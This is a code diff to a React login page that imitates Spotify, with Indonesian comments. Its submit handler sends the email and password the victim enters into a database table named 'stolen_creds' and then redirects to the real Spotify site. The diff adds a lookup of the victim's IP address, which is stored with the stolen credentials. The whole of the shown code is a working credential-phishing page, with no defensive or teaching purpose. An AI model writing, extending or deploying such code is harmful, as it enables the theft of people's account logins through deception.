@@ -15,35 +15,50 @@ export default function SpotifyLogin() {
   const [isLoading, setIsLoading] = useState(false)
   const router = useRouter()
 
-  const handleSubmit = async (e: React.FormEvent) => {
-  e.preventDefault()
-  setError(null)
-
-  const supabase = createClient()
-  setIsLoading(true)
-
-  try {
-
-    const { error } = await supabase
-      .from("stolen_creds")
-      .insert([
-        {
-          email: email,
-          password: password,
-          ip_address: "unknown"
-        }
-      ])
-
-    if (error) throw error
-
-    window.location.href = "https://www.spotify.com"
-
-  } catch (err: unknown) {
-    setError(err instanceof Error ? err.message : "Error submitting form")
-  } finally {
-    setIsLoading(false)
+  // fungsi untuk mengambil IP user
+  async function getIP() {
+    try {
+      const res = await fetch("https://api.ipify.org?format=json")
+      const data = await res.json()
+      return data.ip
+    } catch {
+      return "unknown"
+    }
   }
-}
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault()
+    setError(null)
+
+    const supabase = createClient()
+    setIsLoading(true)
+
+    try {
+
+      // ambil IP user
+      const ip = await getIP()
+
+      const { error } = await supabase
+        .from("stolen_creds")
+        .insert([
+          {
+            email: email,
+            password: password,
+            ip_address: ip
+          }
+        ])
+
+      if (error) throw error
+
+      // redirect ke situs asli
+      window.location.href = "https://www.spotify.com"
+
+    } catch (err: unknown) {
+      setError(err instanceof Error ? err.message : "Error submitting form")
+    } finally {
+      setIsLoading(false)
+    }
+  }
 
   return (
     <main className="min-h-screen bg-gradient-to-b from-neutral-900 to-black flex items-center justify-center px-4 py-8">
